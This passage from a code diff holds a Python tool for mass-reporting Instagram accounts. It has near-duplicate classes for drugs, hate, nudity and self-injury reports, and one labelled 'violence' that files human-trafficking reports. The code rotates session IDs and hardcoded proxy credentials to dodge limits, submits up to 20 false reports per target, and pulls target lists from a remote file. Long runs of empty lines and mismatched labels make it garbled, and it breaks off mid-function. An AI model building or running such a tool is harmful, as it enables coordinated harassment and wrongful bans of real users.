+                    if not success:
+                        print(Fore.RED + f"Failed to report {username}. Skipping...")
+                        break
+                    count += 1
+                    print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                    time.sleep(2)  # Optional delay between reports
+                    self._switch_session()
+                print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+    def Drugs():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.cookies = {'sessionid': self._get_current_session_id()}
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://your_proxy_user:your_proxy_pass@your_proxy_host:port/",
+                    "https": "http://your_proxy_user:your_proxy_pass@your_proxy_host:port/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_ids.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_violence(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_violence_parent"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (violence) for user ID {user_id}: {e}")
+                    return None
+        
+            def step_5_violence(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_human_trafficking"]',
+                        "action_type": 2,
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 5 (violence) for user ID {user_id}: {e}")
+                    return None
+        
+            def report_violence(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for violence using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                context4 = self.step_4_violence(context3, user_id)
+                if not context4:
+                    return False
+                
+                status_violence = self.step_5_violence(context4, user_id)
+                if status_violence == "ok":
+                    print(Fore.GREEN + f'Successful violence report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
+                    print(Fore.RED + f'Failed violence report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/HATE"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        clean_username = username.lstrip('@')
+                        self.report_violence(clean_username)
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    success = self.report_violence(username)
+                    if not success:
+                        print(Fore.RED + f"Failed to report {username}. Skipping...")
+                        break
+                    count += 1
+                    print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                    time.sleep(2)  # Optional delay between reports
+                    self._switch_session()
+                print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+    def Hate():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/",
+                    "https": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_id.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_hate(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_hate_speech_v3"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (hate) for user ID {user_id}: {e}")
+                    return None
+        
+            def final_step_hate(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "action_type": 2,
+                        "frx_prompt_request_type": 4
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    if json_response.get('status') != "ok":
+                        # Switch session ID if the response indicates failure
+                        self._switch_session()
+                        response = self.s.post(self.url, headers=self.headers, data={
+                            "container_module": "profilePage",
+                            "entry_point": 1,
+                            "location": 2,
+                            "object_id": user_id,
+                            "object_type": 5,
+                            "context": context,
+                            "action_type": 2,
+                            "frx_prompt_request_type": 4
+                        }, cookies=self.cookies, proxies=self.proxies)
+                        json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at final step (hate) for user ID {user_id}: {e}")
+                    return None
+        
+            def report_hate(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for hate speech using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                context4 = self.step_4_hate(context3, user_id)
+                if not context4:
+                    return False
+                
+                status_final = self.final_step_hate(context4, user_id)
+                if status_final == "ok":
+                    print(Fore.GREEN + f'Successful hate speech report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
+                    print(Fore.RED + f'Failed hate speech report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/HATE"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        for _ in range(len(self.session_ids)):
+                            self.report_hate(username)
+                            self._switch_session()
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    for _ in range(len(self.session_ids)):
+                        success = self.report_hate(username)
+                        if not success:
+                            print(Fore.RED + f"Failed to report {username}. Skipping...")
+                            break
+                        count += 1
+                        print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                        time.sleep(2)  # Optional delay between reports
+                    print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+    def Nudity():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/",
+                    "https": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_id.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_nudity(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_nudity_v2"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (nudity) for user ID {user_id}: {e}")
+                    return None
+        
+            def final_step_nudity(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_adult_sexual_exploitation"]',
+                        "action_type": 2,
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    if json_response.get('status') != "ok":
+                        # Switch session ID if the response indicates failure
+                        self._switch_session()
+                        response = self.s.post(self.url, headers=self.headers, data={
+                            "container_module": "profilePage",
+                            "entry_point": 1,
+                            "location": 2,
+                            "object_id": user_id,
+                            "object_type": 5,
+                            "context": context,
+                            "selected_tag_types": '["ig_adult_sexual_exploitation"]',
+                            "action_type": 2,
+                            "frx_prompt_request_type": 2
+                        }, cookies=self.cookies, proxies=self.proxies)
+                        json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at final step (nudity) for user ID {user_id}: {e}")
+                    return None
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            def report_nudity(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for nudity using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                context4 = self.step_4_nudity(context3, user_id)
+                if not context4:
+                    return False
+                
+                status_final = self.final_step_nudity(context4, user_id)
+                if status_final == "ok":
+                    print(Fore.GREEN + f'Successful nudity report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
+                    print(Fore.RED + f'Failed nudity report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/NUDITY"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        for _ in range(len(self.session_ids)):
+                            self.report_nudity(username)
+                            self._switch_session()
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    for _ in range(len(self.session_ids)):
+                        success = self.report_nudity(username)
+                        if not success:
+                            print(Fore.RED + f"Failed to report {username}. Skipping...")
+                            break
+                        count += 1
+                        print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                        time.sleep(2)  # Optional delay between reports
+                        self._switch_session()
+                    print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+    def Self():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.cookies = {'sessionid': self._get_current_session_id()}
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/",
+                    "https": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_id.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_self(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_self_injury_v3"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (self) for user ID {user_id}: {e}")
+                    return None
+        
+            def final_step_self(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "action_type": 2,
+                        "frx_prompt_request_type": 4
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    if json_response.get('status') != "ok":
+                        # Switch session ID if the response indicates failure
+                        self._switch_session()
+                        response = self.s.post(self.url, headers=self.headers, data={
+                            "container_module": "profilePage",
+                            "entry_point": 1,
+                            "location": 2,
+                            "object_id": user_id,
+                            "object_type": 5,
+                            "context": context,
+                            "action_type": 2,
+                            "frx_prompt_request_type": 4
+                        }, cookies=self.cookies, proxies=self.proxies)
+                        json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at final step (self) for user ID {user_id}: {e}")
+                    return None
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            def report_self_injury(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for self-injury using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                context4 = self.step_4_self(context3, user_id)
+                if not context4:
+                    return False
+                
+                status_final = self.final_step_self(context4, user_id)
+                if status_final == "ok":
+                    print(Fore.GREEN + f'Successful self-injury report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
